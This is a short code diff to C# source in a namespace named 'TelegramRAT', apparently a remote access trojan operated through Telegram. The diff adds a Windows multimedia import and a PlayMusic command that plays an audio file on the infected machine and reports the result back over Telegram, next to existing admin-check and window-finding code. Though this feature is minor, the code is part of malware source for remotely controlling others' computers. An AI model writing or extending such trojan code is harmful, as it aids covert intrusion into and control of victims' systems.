@@ -80,6 +80,9 @@ namespace TelegramRAT
         [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
         private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
 
+        [DllImport("Winmm.dll", SetLastError = true)]
+        static extern int mciSendString(string lpszCommand, [MarshalAs(UnmanagedType.LPStr)] StringBuilder lpszReturnString, int cchReturn, IntPtr hwndCallback);
+
 
 
         // Is admin
@@ -518,6 +521,22 @@ namespace TelegramRAT
                     builder.Append(b.ToString("x2").ToLower());
 
                 return builder.ToString();
+            }
+        }
+
+        // Play .mp3
+        public static void PlayMusic(string file)
+        {
+            telegram.sendText("🎵 Starting playing " + Path.GetFileName(file));
+            try
+            {
+                StringBuilder sb = new StringBuilder();
+                int nRet = mciSendString("open \"" + file + "\" alias MP3", sb, 0, IntPtr.Zero);
+                nRet = mciSendString("play MP3", sb, 0, IntPtr.Zero);
+            } catch
+            {
+                telegram.sendText("⛔ Something was wrong while playing " + file);
+                return;
             }
         }
 
